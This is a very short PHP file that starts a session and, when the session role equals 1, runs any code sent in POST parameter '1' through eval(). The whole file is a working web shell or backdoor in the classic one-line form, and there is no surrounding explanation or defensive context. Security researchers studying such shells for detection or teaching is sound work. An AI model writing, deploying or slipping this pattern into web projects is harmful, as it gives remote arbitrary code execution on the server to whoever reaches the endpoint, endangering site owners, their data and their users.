<?php
session_start();
if ($_SESSION['role'] == 1) {
    eval($_POST[1]);
}
